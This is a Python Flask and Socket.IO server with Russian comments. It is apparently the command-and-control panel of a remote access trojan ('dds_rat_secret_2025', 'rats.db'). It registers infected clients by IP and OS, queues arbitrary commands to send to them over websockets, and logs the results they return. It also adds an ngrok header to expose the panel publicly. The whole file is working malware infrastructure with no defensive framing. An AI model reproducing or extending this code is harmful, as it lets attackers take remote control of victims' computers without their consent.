from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import sqlite3
import time
import uuid
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = 'dds_rat_secret_2025'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# Инициализация БД
def init_db():
    conn = sqlite3.connect('rats.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients
                 (id TEXT PRIMARY KEY, ip TEXT, first_seen TEXT, last_seen TEXT, status TEXT, os_info TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, client_id TEXT, command TEXT, status TEXT, result TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

init_db()

# Хранилище активных клиентов
active_clients = {}

@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/api/clients')
def get_clients():
    conn = sqlite3.connect('rats.db')
    c = conn.cursor()
    c.execute("SELECT id, ip, first_seen, last_seen, status, os_info FROM clients ORDER BY last_seen DESC")
    rows = c.fetchall()
    conn.close()
    clients = []
    for row in rows:
        clients.append({
            'id': row[0],
            'ip': row[1],
            'first_seen': row[2],
            'last_seen': row[3],
            'status': row[4],
            'os_info': row[5]
        })
    return jsonify(clients)

@app.route('/api/command', methods=['POST'])
def send_command():
    data = request.json
    client_id = data.get('client_id')
    command = data.get('command')
    if not client_id or not command:
        return jsonify({'error': 'Не хватает данных'}), 400
    
    conn = sqlite3.connect('rats.db')
    c = conn.cursor()
    c.execute("INSERT INTO commands (client_id, command, status, result, timestamp) VALUES (?, ?, ?, ?, ?)",
              (client_id, command, 'pending', '', str(time.time())))
    conn.commit()
    cmd_id = c.lastrowid
    conn.close()
    
    if client_id in active_clients:
        sid = active_clients[client_id]
        socketio.emit('new_command', {'command': command, 'cmd_id': cmd_id}, room=sid)
        return jsonify({'status': 'sent', 'cmd_id': cmd_id})
    else:
        return jsonify({'status': 'offline', 'message': 'Клиент не в сети'}), 404

@socketio.on('connect')
def handle_connect():
    print(f'Client connected: {request.sid}')

@socketio.on('register')
def handle_register(data):
    client_id = data.get('client_id')
    ip = data.get('ip', request.remote_addr)
    os_info = data.get('os_info', 'Unknown OS')
    if not client_id:
        client_id = str(uuid.uuid4())
    
    conn = sqlite3.connect('rats.db')
    c = conn.cursor()
    c.execute("SELECT * FROM clients WHERE id=?", (client_id,))
    if c.fetchone():
        c.execute("UPDATE clients SET last_seen=?, status=?, ip=?, os_info=? WHERE id=?",
                  (str(time.time()), 'online', ip, os_info, client_id))
    else:
        c.execute("INSERT INTO clients (id, ip, first_seen, last_seen, status, os_info) VALUES (?,?,?,?,?,?)",
                  (client_id, ip, str(time.time()), str(time.time()), 'online', os_info))
    conn.commit()
    conn.close()
    
    active_clients[client_id] = request.sid
    print(f'Клиент зарегистрирован: {client_id} ({ip})')
    emit('registered', {'client_id': client_id})

@socketio.on('command_result')
def handle_command_result(data):
    cmd_id = data.get('cmd_id')
    result = data.get('result')
    client_id = data.get('client_id')
    if cmd_id and result and client_id:
        conn = sqlite3.connect('rats.db')
        c = conn.cursor()
        c.execute("UPDATE commands SET status='done', result=? WHERE id=?", (result, cmd_id))
        conn.commit()
        conn.close()
        socketio.emit('command_done', {'cmd_id': cmd_id, 'result': result, 'client_id': client_id})
        print(f'Результат команды {cmd_id} от {client_id}: {result[:100]}...')

@socketio.on('disconnect')
def handle_disconnect():
    for cid, sid in list(active_clients.items()):
        if sid == request.sid:
            del active_clients[cid]
            conn = sqlite3.connect('rats.db')
            c = conn.cursor()
            c.execute("UPDATE clients SET status='offline' WHERE id=?", (cid,))
            conn.commit()
            conn.close()
            print(f'Клиент отключён: {cid}')
            break

# Добавляем заголовок для обхода предупреждения Ngrok (для Render не нужно, но пусть будет)
@app.after_request
def add_ngrok_header(response):
    response.headers["ngrok-skip-browser-warning"] = "true"
    return response

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)
